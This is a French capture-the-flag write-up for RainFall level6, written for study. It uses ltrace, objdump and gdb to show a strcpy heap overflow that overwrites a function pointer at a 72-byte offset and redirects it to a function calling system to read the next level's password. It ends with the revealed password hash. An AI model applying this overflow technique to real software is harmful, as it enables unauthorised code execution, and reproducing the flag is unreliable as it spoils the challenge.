Nous avons un binaire ./level6, nous testons **ltrace**:
```bash
level6@RainFall:~$ ltrace ./level6
__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                    = 0x0804a008
malloc(4)                                                     = 0x0804a050
strcpy(0x0804a008, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Nous avons un segfault, il faut donc passer des arguments:

```bash
level6@RainFall:~$ ltrace ./level6 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
__libc_start_main(0x804847c, 2, 0xbffff7a4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                    = 0x0804a008
malloc(4)                                                     = 0x0804a050
strcpy(0x0804a008, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 0x0804a008
puts("Nope"Nope
)                                                  = 5
+++ exited (status 5) +++
```
On remarque que les deux appels successifs à **malloc** renvoient des adresses qui sont contiguës:
**0x0804a008** et **0x0804a050**
désassemblons:

```bash
level6@RainFall:~$ objdump -M intel -d ./level6

...
08048454 <n>:
 8048454:       55                      push   ebp
 8048455:       89 e5                   mov    ebp,esp
 8048457:       83 ec 18                sub    esp,0x18
 804845a:       c7 04 24 b0 85 04 08    mov    DWORD PTR [esp],0x80485b0
 8048461:       e8 0a ff ff ff          call   8048370 <system@plt>
 8048466:       c9                      leave
 8048467:       c3                      ret

08048468 <m>:
 8048468:       55                      push   ebp
 8048469:       89 e5                   mov    ebp,esp
 804846b:       83 ec 18                sub    esp,0x18
 804846e:       c7 04 24 d1 85 04 08    mov    DWORD PTR [esp],0x80485d1
 8048475:       e8 e6 fe ff ff          call   8048360 <puts@plt>
 804847a:       c9                      leave
 804847b:       c3                      ret

0804847c <main>:
 804847c:       55                      push   ebp
 804847d:       89 e5                   mov    ebp,esp
 804847f:       83 e4 f0                and    esp,0xfffffff0
 8048482:       83 ec 20                sub    esp,0x20
 8048485:       c7 04 24 40 00 00 00    mov    DWORD PTR [esp],0x40
 804848c:       e8 bf fe ff ff          call   8048350 <malloc@plt>
 8048491:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 8048495:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
 80484a1:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 80484a5:       ba 68 84 04 08          mov    edx,0x8048468
 80484aa:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ae:       89 10                   mov    DWORD PTR [eax],edx
 80484b0:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484b3:       83 c0 04                add    eax,0x4
 80484b6:       8b 00                   mov    eax,DWORD PTR [eax]
 80484b8:       89 c2                   mov    edx,eax
 80484ba:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484be:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80484c2:       89 04 24                mov    DWORD PTR [esp],eax
 80484c5:       e8 76 fe ff ff          call   8048340 <strcpy@plt>
 80484ca:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ce:       8b 00                   mov    eax,DWORD PTR [eax]
 80484d0:       ff d0                   call   eax
 80484d2:       c9                      leave
 80484d3:       c3                      ret
 80484d4:       90                      nop
```
On lance gdb.
plusieurs points:
- 2 fonctions m et n intéressantes.
- n contient un appel à **system** vec l'argument "/bin/cat /home/user/level7/.pass" -> c'est notre target visiblement.
```bash
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
(gdb) x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"
```
- Un appel a strcpy dont savons qu'il est vulnérable à un buffer overrun d'après le man
- un call a **eax** de main intéressant, il faut voir l'adresse de cette fonction appellée. On met un bp avant le call et on run gdb:
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
=> 0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) i r
eax            0x8048468        134513768
ecx            0xbffff900       -1073743616
edx            0x804a023        134520867
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6e0       0xbffff6e0
ebp            0xbffff708       0xbffff708
esi            0x0      0
edi            0x0      0
eip            0x80484d0        0x80484d0 <main+84>
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s 0x8048468
0x8048468 <m>:   "U\211\345\203\354\030\307\004$х\004\b\350\346\376\377\377\311\303U\211\345\203\344\360\203\354 \307\004$@"
```
il s'agit de la fonction **m**
> La stratégie consiste donc à remplacer l'adresse de **m** par celle de **n** pour accéder à **system** grâce au buffer overrun des deux adresses **malloc** contiguës.
On cherche dans un premier temps grâce à un script qui génère un pattern:
```bash
level6@RainFall:~$ /tmp/pattern.py > /tmp/6l
level6@RainFall:~$ cat /tmp/6l
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

level6@RainFall:~$ gdb ./level6 -q
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) set disassembly flavor intel
Undefined item: "flavor intel".
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret

(gdb) b main
Breakpoint 1 at 0x804847f
(gdb) set args Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
(gdb) show args
Argument list to give program being debugged when it is started is "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A".
(gdb) r
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x0804847f in main ()
...
(gdb) s
Single stepping until exit from function main,
which has no line number information.

Breakpoint 1, 0x080484d0 in main ()
(gdb) i r
eax            0x41346341       1093952321
ecx            0xbffff900       -1073743616
edx            0x804a069        134520937
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6a0       0xbffff6a0
ebp            0xbffff6c8       0xbffff6c8
esi            0x0      0
edi            0x0      0
eip            0x80484d0        0x80484d0 <main+84>
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) info frame
Stack level 0, frame at 0xbffff6d0:
 eip = 0x80484d0 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff6c8, args:
 Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
 Saved registers:
  ebp at 0xbffff6c8, eip at 0xbffff6cc
(gdb) b *0x080484d3
Breakpoint 6 at 0x80484d3
(gdb) s
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```
A la fin on constate un segfault à **0x41346341** qui ressemble à notre pattern, analysons l'offset:
```bash
level6@RainFall:~$ python /tmp/pattern.py /tmp/6l 0x41346341
offset found at: 72
```
donc 72 octets, il faut donc préparer un buffer terminant par l'adresse de n i.e. **0x08048454** à l'octet 72 pour l'insérer dans **eax** et récupérer cet appel:
```bash
level6@RainFall:~$ python /tmp/exploit.py 0x08048454 72
crafting payload...
done:
/tmp/payload_level6
level6@RainFall:~$ cat /tmp/payload_level6 | xargs ./level6
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
Bim
